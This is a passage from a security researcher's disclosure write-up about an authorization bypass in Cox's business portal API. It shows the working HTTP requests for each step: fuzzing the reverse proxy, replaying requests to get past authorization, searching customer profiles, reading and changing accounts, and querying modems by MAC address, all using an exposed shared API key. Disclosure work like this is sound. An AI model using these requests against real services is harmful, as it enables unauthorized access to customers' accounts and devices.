<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>To theorycraft a little bit, if I were a hacker who wanted to compromise my modem I'd likely target whatever infrastructure powered the support tools that the agents were using. There was probably some internal website for device management that support agents used, backed by an API that could execute arbitrary commands and change/view administrative settings of customer devices. If I could find some way to access this functionality, it might shed light on how I might have been originally hacked and patch out at least one method for someone to compromise my modem.</p>
<h2 id="hacking-millions-of-modems">Hacking Millions of Modems</h2>
<p>The first thing that I decided to look at was the Cox Business portal. This app had a ton of interesting functionality to remotely manage devices, set firewall rules, and monitor network traffic.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Without actually having a Cox business account myself, I opened the login page for the portal and grabbed a copy of the <code>main.36624ed36fb0ff5b.js</code> file that powered the core functionality of the app. After beautifying it, I parsed out all of the routes and scrolled through them:</p>
<pre><code>/api/cbma/voicemail/services/voicemail/inbox/transcribeMessage/
/api/cbma/profile/services/profile/userroles/
/api/cbma/accountequipment/services/accountequipment/equipments/eligibleRebootDevice
/api/cbma/accountequipment/services/accountequipment/casedetail
/api/cbma/user/identity/services/useridentity/user/verifyContact
/api/cbma/user/identity/services/useridentity/user/contact/validate
...
</code></pre>
<p>There were over 100 different API calls that all had the same base path of <code>/api/cbma/</code>. Since this route seemed to be power most device-related functionality, I thought it was worth investigating if the <code>/api/cbma/</code> endpoint happened to be a reverse proxy to another host. I tested this by sending the following requests:</p>
<h3 id="http-request-that-does-not-start-with-apicbma-returns-301">HTTP request that does not start with api/cbma (returns 301):</h3>
<pre><code><span>GET</span> <span>/api/anything_else/example</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>301</span> <span>Moved</span> <span>Permanently</span>
<span>Location:</span> <span>https://myaccount-business.cox.com/cbma/api/anything_else/example</span>
</code></pre>
<h3 id="http-request-that-does-start-with-apicbma-returns-500">HTTP request that does start with api/cbma (returns 500):</h3>
<pre><code><span>GET</span> <span>/api/cbma/example</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Server:</span> <span>nginx</span>
</code></pre>
<p>From sending the above HTTP requests, we learn that the <code>api/cbma</code> endpoint is an explicit route that is likely a reverse proxy to another host due to the differing behavior around the HTTP response. When we request anything besides <code>api/cbma</code>, it responds with a 302 redirect instead of the 500 internal server error triggered from <code>api/cbma</code>.</p>
<p>This indicated that they were proxying API requests to a dedicated backend while serving the frontend files from the normal system.</p>
<p>Since the API itself had all of the interesting device management functionality, it made sense to focus on everything behind the <code>api/cbma</code> route and see if there was any low hanging fruit like exposed actuators, API documentation, or any directory traversal vulnerabilities that would allow us to escalate permissions.</p>
<p>I went ahead and proxied the registration request for the Cox Business portal which was underneath the <code>api/cbma</code> path:</p>
<pre><code><span>POST</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>User-Agent:</span> <span>Mozilla/5.0</span> <span>(Windows</span> <span>NT</span> <span>10.0</span><span>;</span> <span>Win64;</span> <span>x64;</span> <span>rv:124.0)</span> <span>Gecko/20100101</span> <span>Firefox/124.0</span>
<span>Accept:</span> <span>application/json,</span> <span>text/plain,</span> <span>*/*</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
<span>Ma_transaction_id:</span> <span>a85dc5e0-bd9d-4f0d-b4ae-4e284351e4b4</span>
<span>Content-Length:</span> <span>28</span>
<span>Connection:</span> <span>close</span>

{<span>"email"</span><span>:"test@example.com"</span>}
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Content-Length:</span> <span>126</span>

{
  <span>"message":</span> <span>"Success"</span>,
  <span>"id":</span> <span>"test@example.com"</span>
}
</code></pre>
<p>The HTTP request contained a bunch of different authorization headers including what looked to be a general-use API key that was shared between users. The <code>clientid</code> and <code>Cb_session</code> keys looked very custom and indicated there were multiple roles and permissions used in the application.</p>
<p>The HTTP response looked like a generic Spring response, and we could likely quickly confirm that the backend API was running spring by simply changing the POST to GET and observing the response:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"timestamp":</span> <span>"2024-04-12T08:57:14.384+00:00"</span>,
  <span>"status":</span> <span>500</span>,
  <span>"error":</span> <span>"Internal Server Error"</span>,
  <span>"path":</span> <span>"/services/profile/validate/v1/email"</span>
}
</code></pre>
<p>Yup, that was definitely a Spring error. Since we could confirm that the reverse proxy was running Spring, I decided to look for actuators and exposed API docs.</p>
<p>I went ahead and tried to guess the actuator route:</p>
<pre><code><span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/actuator/</span>
</code></pre>
<p>Shame, no easy actuators. I then checked for accessible API documentation:</p>
<pre><code><span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/index.html</span>
<span>✅</span> <span>GET</span> <span>/api/cbma/userauthorization/swagger-ui/index.html</span>
</code></pre>
<p>We had a hit! There was a swagger landing page at <code>/api/cbma/profile/swagger-ui/index.html</code>. I loaded the page expecting to see API routes, however...</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Totally empty. Something was causing the page not to load. I checked the network traffic and there seemed to be in an infinite redirect loop when attempting to load any static resource:</p>
<pre><code><span>GET</span> <span>/api/cbma/ticket/services/swagger-ui/swagger-initializer.js</span> <span>HTTP/1.1</span>
<span>Location:</span> <span>/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js</span>
<span>...</span>
<span>GET</span> <span>/cbma/api/cbma/ticket/services/swagger-ui/swagger-initializer.js</span> <span>HTTP/1.1</span>
<span>Location:</span> <span>/cbma/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js</span>
</code></pre>
<p>It seemed that requests to load static resources for the page (<code>.png</code>, <code>.js</code>, <code>.css</code>) were all being routed through the base URI instead of the reverse proxy API host. What this meant was there was probably a proxy rule for static assets, so I changed the extension to test this:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.anythingElse</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Server:</span> <span>nginx</span>
</code></pre>
<p>After confirming that the <code>.js</code> extension was triggering the routing of the request to the original host, we now needed to find a way to load the resource from the API reverse proxy but without hitting the rule condition which switched routing for static files. The simplest way to do this, since the request was being proxied, was to check if there was any character that we could add which would “drop off” in transit.</p>
<h3 id="loading-static-resources-from-reverse-proxy-api">Loading Static Resources from Reverse Proxy API</h3>
<p>To fuzz this, I simply used Burp’s intruder to enumerate from <code>%00</code> to <code>%FF</code> at the end of the URL. After about 30 seconds of running, we had a 200 OK by appending the URL encoded <code>/</code> symbol:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js%2f</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP</span>/<span>2</span> <span>200</span> <span>OK</span>
<span>Content</span>-<span>Type</span>: application/javascript

<span>window</span>.<span>onload</span> = <span>function</span>(<span></span>) { <span>window</span>.<span>ui</span> = <span>SwaggerUIBundle</span>({ <span>url</span>: <span>"https://petstore.swagger.io/v2/swagger.json"</span>, <span>dom_id</span>: <span>'#swagger-ui'</span>, <span>deepLinking</span>: <span>true</span>, <span>presets</span>: [ <span>SwaggerUIBundle</span>.<span>presets</span>.<span>apis</span>, <span>SwaggerUIStandalonePreset</span> ], <span>plugins</span>: [ <span>SwaggerUIBundle</span>.<span>plugins</span>.<span>DownloadUrl</span> ], <span>layout</span>: <span>"StandaloneLayout"</span> , <span>"configUrl"</span> : <span>"/services/v3/api-docs/swagger-config"</span>, <span>"validatorUrl"</span> : <span>""</span> }); <span>//&lt;/editor-fold&gt; };</span>
</code></pre>
<p>By appending the <code>%2f</code> to the <code>.js</code> extension, we could load the JS files. I wrote a rule to append <code>%2f</code> to all static resources using Burp’s match-and-replace then reloaded the page.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Perfect, the swagger routes had loaded. I used the same trick to load all the swagger docs on all of the other API endpoints. In total, there were about 700 different API calls with each API having the following number of calls:</p>
<pre><code>account (115 routes)
voiceutilities (73 routes)
user (70 routes)
datainternetgateway (57 routes)
accountequipment (55 routes)
billing (53 routes)
ticket (52 routes)
profile (47 routes)
voicecallmanagement (46 routes)
voicemail (37 routes)
voiceusermanagement (30 routes)
userauthorization (24 routes)
csr (16 routes)
voiceprofile (14 routes)
</code></pre>
<p>After quickly skimming through everything, the following APIs appeared to have the most functionality for interacting with hardware and accessing customer accounts:</p>
<pre><code>accountequipment (55 routes)
datainternetgateway (57 routes)
account (115 routes)
</code></pre>
<p>Copying the HTTP request that I’d used to register to the website, I ran an intruder script to hit every single GET endpoint to check if there were any accessible unauthenticated API endpoints. What came back was really interesting. There was a 50/50 split of endpoints which gave an authorization error or 200 OK HTTP response.</p>

<p>After the intruder scan of all of the API endpoints completed, I scrolled through to see if any had any interesting responses. The following "profilesearch" endpoint had an interesting HTTP response which appeared to be returning a blank JSON object from what looked to be an empty search:</p>
<pre><code><span>GET</span> <span>/api/cbma/profile/services/profile/profilesearch/</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"message":</span> <span>"Success"</span>,
  <span>"profile":</span> {
    <span>"numberofRecords":</span> <span>"0 hits"</span>,
    <span>"searchList":</span> []
  }
}
</code></pre>
<p>From looking at the JavaScript, it seemed that we’d need to add an argument to the URI for a profile to search for. I went ahead and typed in <code>test</code> into the URI and got the following response:</p>
<pre><code><span>{</span>
  <span>"message"</span><span>:</span> <span>"Authorization Error-Invalid User Token"</span>
<span>}</span>
</code></pre>
<p>Invalid user token? But I’d just been able to hit this endpoint? I removed the word <code>test</code> from the URI and resent this request. Another authorization error! For some reason, the original endpoint without parameters was now returning an authorization error even though we could just hit it when running intruder.</p>
<p>I did a sanity check and confirmed that nothing had changed between the request in intruder and my repeater request. I replayed the request one more time, but surprisingly this time it gave me the original 200 OK and the JSON response from intruder! What was going on? It seemed to be intermittently giving me authorization errors or saying that the request had been successful.</p>
<p>To test if I could reproduce this with an actual search query, I wrote down <code>cox</code> in the URI and replayed the request 2-3 more times until I saw the following response:</p>
<pre><code><span>{</span>
  <span>"message"</span><span>:</span> <span>"Success"</span><span>,</span>
  <span>"profile"</span><span>:</span> <span>{</span>
    <span>"numberofRecords"</span><span>:</span> <span>"10000+ hits"</span><span>,</span>
    <span>"searchList"</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"COX REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"cbbccdae-b1ab-4e8c-9cec-e20c425205a1"</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"Cox Communications SIP Trunk REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"bc2a49c7-0c3f-4cab-9133-de7993cb1c7d"</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"cox test account ds1/REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"74551032-e703-46a2-a252-dc75d6daeedc"</span>
      <span>}</span>
    <span>]</span>
  <span>}</span>
<span>}</span>
</code></pre>
<p>Woah! These looked like profiles of Cox business customers. Not really expecting results, I replaced the word "cox" with "fbi" to see if it was actually pulling customer data:</p>
<pre><code><span>{</span>
  <span>"message"</span><span>:</span> <span>"Success"</span><span>,</span>
  <span>"profile"</span><span>:</span> <span>{</span>
    <span>"numberofRecords"</span><span>:</span> <span>"REDACTED hits"</span><span>,</span>
    <span>"searchList"</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"FBI REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"7b9f092a-e938-41d5-bcf5-0be1bb6487f5"</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"FBI REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"c8923f6f-b4ed-4f66-a743-000a961edb35"</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"FBI REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"a32b8112-48ac-4a4f-8893-5ca1c392a31d"</span>
      <span>}</span>
    <span>]</span>
  <span>}</span>
<span>}</span>
</code></pre>
<p>Oh, no. The above response contained the physical addresses of several FBI field offices who were Cox business customers. The administrative customer search API request was working. Not good!</p>
<p>We had confirmed that we could bypass authorization for the API endpoints by simply replaying the HTTP request multiple times, and there were over 700 other API requests that we could hit. It was time to see what the real impact was.</p>
<h3 id="confirming-we-can-access-anyones-equipment">Confirming We Can Access Anyone's Equipment</h3>
<p>I looked back at the results of the intruder scan, now knowing that I could bypass authorization by simply replaying a request. In order to figure out if this vulnerability could've been used to hack my modem, I needed to know if this API had access to the residential network at an access control level. Cox offered both residential and business services, but under the hood, I was guessing that the underlying API had access to both.</p>
<p>I went ahead and pulled out the simplest looking request that took in a <code>macAddress</code> parameter to test if I could access my own modem via the API.</p>
<pre><code>/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=:mac
</code></pre>
<p>This was a GET request to retrieve a modem IP address that required a <code>macAddress</code> parameter. I logged into Cox, retrieved my own MAC address, then sent the HTTP request over-and-over until it returned 200 OK:</p>
<pre><code><span>GET</span> <span>/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=f80c58bbcb90</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"message":</span> <span>"Success"</span>,
  <span>"ipv4":</span> <span>"98.165.155.8"</span>
}
</code></pre>
<p>It worked! We were accessing our own device through the Cox Business website API! This meant that whatever was running on this could actually be used to talk to the devices. Cox provided service to millions of customers, and this API seemingly allowed me to directly communicate via MAC address with anyone's device.</p>
<p>The next question I had was whether or not we could retrieve the MAC addresses of the hardware connected to someone's account via searching their account ID (which we had retrieved previously through the customer query endpoint). I found the <code>accountequipment/services/accountequipment/v1/equipments</code> endpoint in my swagger list and threw it in my Burp Repeater with my own account ID. It returned the following information:</p>
<pre><code><span>GET</span> <span>/api/cbma/accountequipment/services/accountequipment/v1/equipments/435008132203</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"accountEquipmentList":</span> [
    {
      <span>"equipmentCategory":</span> <span>"Internet"</span>,
      <span>"equipmentModelMake":</span> <span>"NOKIA G-010G-A"</span>,
      <span>"equipmentName":</span> <span>"NOKIA G-010G-A"</span>,
      <span>"equipmentType":</span> <span>"Nokia ONT"</span>,
      <span>"itemModelMake":</span> <span>"NOKIA"</span>,
      <span>"itemModelNumber":</span> <span>"G-010G-A"</span>,
      <span>"itemNumber":</span> <span>"DAL10GB"</span>,
      <span>"macAddress":</span> <span>"f8:0c:58:bb:cb:92"</span>,
      <span>"portList":</span> [
        {
          <span>"address":</span> <span>"F80C58BBCB92"</span>,
          <span>"portNumber":</span> <span>"1"</span>,
          <span>"portType":</span> <span>"ONT_ALU"</span>,
          <span>"qualityAssuranceDate":</span> <span>"20220121"</span>,
          <span>"serviceCategoryDescription":</span> <span>"Data"</span>
        }
      ],
      <span>"serialNumber":</span> <span>"ALCLEB313C84"</span>
    },
    {
      <span>"equipmentCategory":</span> <span>"Voice"</span>,
      <span>"equipmentModelMake":</span> <span>"CISCO DPQ3212"</span>,
      <span>"equipmentName":</span> <span>"CISCO DPQ3212"</span>,
      <span>"equipmentType":</span> <span>"Cable Modem"</span>,
      <span>"itemModelMake":</span> <span>"CISCO"</span>,
      <span>"itemModelNumber":</span> <span>"DPQ3212"</span>,
      <span>"itemNumber":</span> <span>"DSA321N"</span>,
      <span>"macAddress":</span> <span>"e4:48:c7:0d:9a:71"</span>,
      <span>"portList":</span> [
        {
          <span>"address":</span> <span>"E448C70D9A71"</span>,
          <span>"portNumber":</span> <span>"1"</span>,
          <span>"portType":</span> <span>"DATA_D3"</span>,
          <span>"qualityAssuranceDate":</span> <span>"20111229"</span>,
          <span>"serviceCategoryDescription":</span> <span>"Unknown"</span>
        },
        {
          <span>"address":</span> <span>"E448C70D9A75"</span>,
          <span>"portNumber":</span> <span>"2"</span>,
          <span>"portType":</span> <span>"TELEPHONY"</span>,
          <span>"qualityAssuranceDate":</span> <span>"20111229"</span>,
          <span>"serviceCategoryCode":</span> <span>"T"</span>,
          <span>"serviceCategoryDescription":</span> <span>"Telephone"</span>
        }
      ],
      <span>"serialNumber":</span> <span>"240880144"</span>
    },
    {
      <span>"equipmentCategory":</span> <span>"Television"</span>,
      <span>"equipmentModelMake":</span> <span>"Cox Business TV (Contour 1)"</span>,
      <span>"equipmentName":</span> <span>"Cox Business TV (Contour 1)"</span>,
      <span>"equipmentType":</span> <span>"Cable Receiver"</span>,
      <span>"itemModelMake":</span> <span>"CISCO"</span>,
      <span>"itemModelNumber":</span> <span>"650"</span>,
      <span>"itemNumber":</span> <span>"GSX9865"</span>,
      <span>"macAddress":</span> <span>"50:39:55:da:93:05"</span>,
      <span>"portList":</span> [
        {
          <span>"address":</span> <span>"44E08EBB6DBC"</span>,
          <span>"portNumber":</span> <span>"1"</span>,
          <span>"portType":</span> <span>"CHDDVRX1"</span>,
          <span>"qualityAssuranceDate":</span> <span>"20131108"</span>,
          <span>"serviceCategoryDescription":</span> <span>"Cable"</span>
        }
      ],
      <span>"serialNumber":</span> <span>"SACDRVKQN"</span>
    }
  ]
}
</code></pre>
<p>It worked! My connected equipment was returned in the HTTP response.</p>
<h3 id="accessing-and-updating-any-cox-business-customer-account">Accessing and Updating any Cox Business Customer Account</h3>
<p>To test if this could be abused to access and modify business customer accounts, I found an API request which could query customers via email. I sent the following HTTP request and saw the following response:</p>
<pre><code><span>GET</span> <span>/api/cbma/user/services/user/admin@cox.net</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"id":</span> <span>"admin@cox.net"</span>,
  <span>"guid":</span> <span>"89d6db21-402d-4a57-a87b-cad85d01b192"</span>,
  <span>"email":</span> <span>"admin@cox.net"</span>,
  <span>"firstName":</span> <span>"Redacted"</span>,
  <span>"lastName":</span> <span>"Redacted"</span>,
  <span>"primaryPhone":</span> <span>"Redacted"</span>,
  <span>"status":</span> <span>"INACTIVE"</span>,
  <span>"type":</span> <span>"RETAIL"</span>,
  <span>"profileAdmin":</span> <span>true</span>,
  <span>"profileOwner":</span> <span>true</span>,
  <span>"isCpniSetupRequired":</span> <span>false</span>,
  <span>"isPasswordChangeRequired":</span> <span>true</span>,
  <span>"timeZone":</span> <span>"EST"</span>,
  <span>"userType":</span> <span>"PROFILE_OWNER"</span>,
  <span>"userProfileDetails":</span> {
    <span>"id":</span> <span>"{3DES}JA1+doxmDYc="</span>,
    <span>"guid":</span> <span>"9795bd4c-92d6-4aa2-ad30-1da4bbcbe1da"</span>,
    <span>"name":</span> <span>"Supreme Carpet Care"</span>,
    <span>"status":</span> <span>"ACTIVE"</span>,
    <span>"ownerEmail":</span> <span>"admin@cox.net"</span>
  },
  <span>"contactType":</span> {
    <span>"contactInfo":</span> [
      {
        <span>"type":</span> <span>"alternateEmail"</span>,
        <span>"value":</span> <span>"redacted@redacted.com"</span>
      }
    ]
  },
  <span>"preferredEmail":</span> <span>"admin@cox.net"</span>
}
</code></pre>
<p>Another similar POST account update request worked. This confirmed we could read and write to business accounts.</p>
<p>At this point, I'd demonstrated that it was possible to (1) search a customer and retrieve their business account PII using only their name, then (2) retrieve the MAC addresses of the connected hardware on their account, then (3) run commands against the MAC address via the API. It was time to find some API endpoints that actually wrote to the device to simulate an attacker attempting to get code execution.</p>
<h3 id="overwriting-anyones-device-settings-via-leaked-cryptographic-secret">Overwriting Anyone's Device Settings via Leaked Cryptographic Secret</h3>
<p>Looking through the swagger docs, it seemed that every hardware modification requests (e.g. update device password) required a parameter called <code>encryptedValue</code>. If I could find a way to generate this value, then I could demonstrate write access to modems which would lead to remote code execution.</p>
<p>To know if I could even generate this <code>encryptedValue</code> parameter, I had to dig through the original JavaScript to figure out exactly how it was being signed.</p>
<figure><img alt="JS" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=3840&amp;q=75"><figcaption>JS</figcaption></figure>
<p>After tracing the <code>encryptedValue</code> parameter back through the JavaScript, I landed on these two functions:</p>
<pre><code><span>encryptWithSaltandPadding</span>(<span>D</span>) {
